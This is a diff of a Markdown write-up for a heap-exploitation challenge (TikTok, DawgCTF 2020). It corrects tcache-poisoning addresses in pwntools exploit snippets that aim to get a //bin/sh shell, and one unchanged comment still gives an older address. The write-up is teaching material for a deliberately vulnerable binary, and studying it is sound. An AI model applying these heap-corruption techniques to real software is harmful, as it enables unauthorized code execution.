@@ -4,7 +4,7 @@
 
 This was a 500 pt pwning challenge for UMBC's DawgCTF 2020, written by the always amazing [Anna](https://twitter.com/annatea16). How can you not love a challenge called TikTok that uses `strtok` (haha) to create a clever vuln and then forces CTF players to wrestle Ke$ha lyrics into an exploitable heap layout. Sadly I didn't see this challenge until a few hours before the CTF ended so I couldn't finish it in time, but I got the flag after the fact. 
 
-Originally I wanted to do a writeup just because when are you ever going to do a Ke$ha-themed CTF challenge? But it became far longer and more in-depth so that I could write something that someone with little to no pwning or heap experience could understand well enough to follow along. I also wanted to show _how_ I solved it so they could try it themselves at home. So please forgive the times I may go too into the weeds, or overly explain things :). 
+Originally I wanted to do a writeup just because when are you ever going to do a Ke$ha-themed CTF challenge? But it became far longer and in-depth as I wrote so that I could make something that someone with little to no pwning or heap experience could understand well enough to follow along. I also wanted to show _how_ I solved it so they could try it themselves at home. So please forgive the times I may go too into the weeds, or overly explain things :). 
 
 However, by reading this you are contractually required to appreciate my Ke$ha puns, sorry no refunds. 
 
@@ -432,7 +432,7 @@ So now we need to construct our heap so that the chunk for song #44 (`chunk A`) 
 # Allocate our main chunks 
 play_song("11") # A: 0x20 chunk, this will get reused for the song #44 chunk
 play_song("12") # B: 0x20 chunk, overwritten with ptr to 0x404078 
-play_song("21") # C: 0x310 chunk, overwritten with ptr to 0x4040b0
+play_song("21") # C: 0x310 chunk, overwritten with ptr to 0x4040c8
 
 # Allocate some chunks to provide buffer in the tcache
 play_song("22") # D: 0x310 chunk 
@@ -482,7 +482,7 @@ chunkA = p64(0x00) * 2
 # Overwrites chunk B tcache ptr w/ addr of song[0].fd
 chunkB = p64(0x00) + p64(0x21) + p64(0x404078) + p64(0x00) 
 # Overwrites chunk C tcache ptr w/ addr of song[1].lyrics_ptr
-chunkC = p64(0x00) + p64(0x311) + p64(0x404080) 
+chunkC = p64(0x00) + p64(0x311) + p64(0x4040c8) 
 
 p.send(chunkA + chunkB + chunkC)
 
@@ -502,11 +502,11 @@ play_song("27") # Removes C from tcache
 
 ```
 
-We do the same thing as before to memset `songs[1].fd` to 0. Then we allocate a chunk of size 0x310 to remove `C` from the tcache. Once done, we play song[0] i.e. song #1, which will read from stdin. We tell it that we want a chunk of size 0x310 by inputting the same byte size as `Rainbow/godzilla.txt` which is `"767"`. Then the heap manager returns us `0x4040b0` from its 0x310 bin, and we're in business. 
+We do the same thing as before to memset `songs[1].fd` to 0. Then we allocate a chunk of size 0x310 to remove `C` from the tcache. Once done, we play song[0] i.e. song #1, which will read from stdin. We tell it that we want a chunk of size 0x310 by inputting the same byte size as `Rainbow/godzilla.txt` which is `"767"`. Then the heap manager returns us `0x4040c8` from its 0x310 bin, and we're in business. 
 
 ```python
 
-# tcache bin 0x310 -> 0x404080 (songs[1])
+# tcache bin 0x310 -> 0x4040c8 (songs[1])
 
 play_song("1") # Reads from STDIN, songs[0] = song #1
 p.sendline("767") # Gives us 0x04040b0 from tcache
@@ -667,7 +667,7 @@ import_song(album + "/" * (24-len(album)))
 play_song("11") # A: 0x20 chunk, used for the song #44 chunk
 play_song("12") # Z: 0x20 chunk, overwritten w/ ptr to 0x404078  
 play_song("19") # B: 0x20 chunk, overwritten by //bin/sh 
-play_song("21") # C: 0x310 chunk, overwritten w/ ptr to 0x4040b0
+play_song("21") # C: 0x310 chunk, overwritten w/ ptr to 0x4040c8
 
 # Allocate ancillary chunks to provide buffer in the tcache
 play_song("22") # D: 0x310 chunk 
@@ -714,7 +714,7 @@ chunkC = p64(0x00) + p64(0x311) + p64(0x4040c8) # Overwrites chunk C tcache ptr 
 p.send(chunkA + chunkB + chunkZ + chunkC) # Sends payload
 
 # tcache bin 0x20  -> B -> 0x404078 (songs[0].fd)
-# tcache bin 0x310 -> C -> 0x404080 (songs[1])
+# tcache bin 0x310 -> C -> 0x4040c8 (songs[1].lyrics_ptr)
 # tcache bin 0x3c0 -> L -> I -> G
 
 play_song("17") # Removes B from 0x20 tcache bin
